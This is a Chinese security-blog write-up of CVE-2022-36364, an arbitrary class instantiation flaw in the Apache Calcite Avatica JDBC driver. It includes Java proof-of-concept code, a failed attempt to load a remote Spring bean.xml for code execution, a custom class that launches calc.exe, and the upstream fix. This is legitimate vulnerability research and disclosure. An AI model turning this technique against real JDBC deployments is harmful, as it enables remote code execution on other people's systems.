---
title: Apache Calcite Avatica 远程代码执行（CVE-2022-36364）
url: https://www.secpulse.com/archives/205880.html
source: 安全脉搏
date: 2025-02-10
fetch_date: 2025-10-06T20:35:14.405180
---

# Apache Calcite Avatica 远程代码执行（CVE-2022-36364）

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# Apache Calcite Avatica 远程代码执行（CVE-2022-36364）

[漏洞](https://www.secpulse.com/archives/category/vul)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2025-02-09

30,310

前段时间看到Apache Calcite Avatica远程代码执行漏洞 CVE-2022-36364 在网上搜索也没有找到相关的分析和复现文章，于是想着自己研究一下，看能不能发现可以利用的方法。

首先利用一下最近比较热门的 Deepseek ，询问他是否清楚漏洞相关的信息。

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202502081558342.png)

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202502081558343.png)

通过回答我们可以了解到这个漏洞的概况，具体漏洞的版本，以及漏洞产生的原因。

## 漏洞简介

Apache Calcite Avatica JDBC 驱动程序根据通过 `httpclient_impl` 连接属性提供的类名来创建 HTTP 客户端实例；但是在驱动程序实例化之前不会验证该类是否实现了预期的接口，这样一来就会导致可以通过调用任意类来执行代码。

执行这个漏洞并造成一定的危害性，还需要两个先决条件：

* 必须拥有控制 JDBC 连接参数的权限
* 类路径中有一个具有 URL 参数和执行代码能力的函数（目前需要自己构造）

## 漏洞复现&分析

简单点，通过 maven 来创建漏洞环境

```
        <!-- https://mvnrepository.com/artifact/org.apache.calcite.avatica/avatica -->
        <dependency>
            <groupId>org.apache.calcite.avatica</groupId>
            <artifactId>avatica</artifactId>
            <version>1.21.0</version>
        </dependency>
```

创建完成漏洞环境后，我们就需要来编写一段代码想办法触发这个漏洞，我个人的建议是通过对比代码补丁，一般来说修复完成代码后，总会写一个测试类来进行测试

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202502081558345.png)

```
import org.apache.calcite.avatica.BuiltInConnectionProperty;
import org.apache.calcite.avatica.ConnectionConfig;
import org.apache.calcite.avatica.ConnectionConfigImpl;
import org.apache.calcite.avatica.remote.AvaticaHttpClient;
import org.apache.calcite.avatica.remote.AvaticaHttpClientFactory;
import org.apache.calcite.avatica.remote.AvaticaHttpClientFactoryImpl;
import java.net.URL;
import java.util.Properties;

public class test {
    public static void main(String[] args) throws Exception {
        Properties props = new Properties();
        props.setProperty(BuiltInConnectionProperty.HTTP_CLIENT_IMPL.name(),"className");
        URL url = new URL("url");
        ConnectionConfig config = new ConnectionConfigImpl(props);
        AvaticaHttpClientFactory httpClientFactory = new AvaticaHttpClientFactoryImpl();
        AvaticaHttpClient client = httpClientFactory.getClient(url, config, null);
    }
}
```

这样一来我们就编写了一个漏洞 Demo `calssName` 和 `url` 的值是我们可以操作控制的，我们进行调试分析一下

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202502081558346.png)

org.apache.calcite.avatica.remote.AvaticaHttpClientFactoryImpl#getClient

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202502081558347.png)

这个地方我们就注意到了最后调用 `instantiateClient` 来处理的两个参数 className 和 url 一个来自于直接传参，另一个来自于 `config.httpClientClass()` 会从 config 对象中获取 HTTP 客户端的实现类名称，并将其作为一个 `String` 返回

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202502081558349.png)

‍

所以当参数传入到 `org.apache.calcite.avatica.remote.AvaticaHttpClientFactoryImpl#instantiateClient` 其中的两个参数 `className` 和 `url` 都是我们可以控制的

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202502081558350.png)

不需要向下继续调试，我们就看到了关键代码 `constructor.newInstance(Objects.requireNonNull(url));`

这样一来我们就可以通过控制 `className` 和 `url` 来实现调用任意类，但是这个类的必须有 URL 参数的处理

刚开始想到的方法是

利用 spring 中的类构造函数加载远程配置实现 RCE

* org.springframework.context.support.ClassPathXmlApplicationContext

```
import org.springframework.context.support.ClassPathXmlApplicationContext;
public class JXpathDemo {
    public static void main(String[] args) {

        String s = "http://127.0.0.1:8080/bean.xml";
        ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(s);
    }
}
```

似乎如此一来就满足了条件，我们先试试

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202502081558352.png)

爆出了一个错误，我们注意到 `lassPathXmlApplicationContext` 类没有接收 `java.net.URL` 参数的构造方法。`ClassPathXmlApplicationContext` 类的构造方法接收的是 `String` 类型的路径，通常是用于加载 Spring 配置文件的路径。

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202502081558353.png)

所以这种利用方式适用于很多种情况 Apache Commons JXPath 远程代码执行、PostgresQL JDBC Driver 任意代码执行 等，但是并不适配当前的环境。(目前还没有找到合适的类来触发利用这种漏洞)

为了进一步体现危害性，我自己创建一个类来体现

```
import java.net.URL;

public class CustomHttpClient {
    private URL url;

    // 构造函数，接受一个 URL 类型的参数
    public CustomHttpClient(URL url) throws Exception {
        Runtime.getRuntime().exec("calc.exe");
    }
}
```

![7](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202502081558354.gif)

## 漏洞修复

通过对比我们发现对传入的类进行了控制，限定必须属于`AvaticaHttpClient` 的子类

<https://github.com/apache/calcite-avatica/commit/0c097b6a685fc1f97f151505a219976f15ed0c4c?diff=split&w=0>

![image](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202502081558355.png)

**本文作者：[蚁景网安实验室](newpage/author?author_id=37244)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/205880.html**](https://www.secpulse.com/archives/205880.html)

点赞：
2
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![Solon框架模板漏洞深度剖析与修复实战](https://www.yijinglab.com/guide-img/d9634e2f-3b66-42e7-8279-c0877cdd70e5/7266edd7-a4cc-444d-bacb-7ee802487ac4.png)

  Solon框架模板漏洞深度剖析与修复实战](https://www.secpulse.com/archives/206316.html "详细阅读 Solon框架模板漏洞深度剖析与修复实战")
* [![路由器安全研究：D-Link DIR-823G v1.02 B05 复现与利用思路](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202503171628715.png)

  路由器安全研究：D-Link DIR-8](https://www.secpulse.com/archives/206007.html "详细阅读 路由器安全研究：D-Link DIR-823G v1.02 B05 复现与利用思路")
* [![DedeBIZ系统审计小结](https://m-1254331109.cos.ap-guangzhou.myqcloud.com/202502121526395.png)

  DedeBIZ系统审计小结](https://www.secpulse.com/archives/205891.html "详细阅读 DedeBIZ系统审计小结")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2024/12/logo-white.png)](https://www.secpulse.com/newpage/author?autho...